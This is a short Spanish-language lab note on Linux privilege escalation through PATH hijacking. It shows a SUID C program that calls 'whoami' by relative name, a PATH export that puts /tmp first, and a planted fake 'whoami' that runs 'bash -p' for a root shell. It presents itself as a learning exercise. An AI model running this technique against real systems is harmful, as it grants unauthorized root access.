
apt install gcc
nano test.c

Scritp en C
	  `GNU nano 7.2                         test.c`                                   
`#include <stdio.h>`

`int main(){`
        `setuid(0);`
        `printf("\n[+] Actualmente somos el siguiente usuario:\n\n");`
        `system("/usr/bin/whoami");`
        `printf("\n[+] Actualmente somos el siguiente usuario:\n\n");`
        `system("whoami");`
        `return 0;`
`}`

utilizamos gcc test.c -o test
chmod u+s test
./test

vemos el output que nos da
![[Pasted image 20250419230237.png]]

lo que haremos es

echo $PATH
![[Pasted image 20250419230639.png]]

Esta variable de entorno la vamos a manipular de la siguiente manera

export PATH=/tmp/:$PATH

![[Pasted image 20250419230813.png]]
Esto hace que utilice primero tmp al inicio de la busqueda por prioridad
entonces crearemos un script whoami en el directorio tmp
asi elegira primero el whoami malicios de /tmp/ antes de llegar al original de /usr/bin

touch whoami
chmod +x whoami
nano whoami
          `GNU nano 7.2           whoami *`            
`bash -p` 


De esta manera ejecutamos el ./test anteriormente creado y eso hace que de manera paralela ejecuta un `whoami` que se ejecutara primero el del directorio /tmp/ ya que modificamos el orden de prioridad del `$PATH`
![[Pasted image 20250419231308.png]]


ESTO SE PUEDE HACER CON CUALQUIER BINARIO
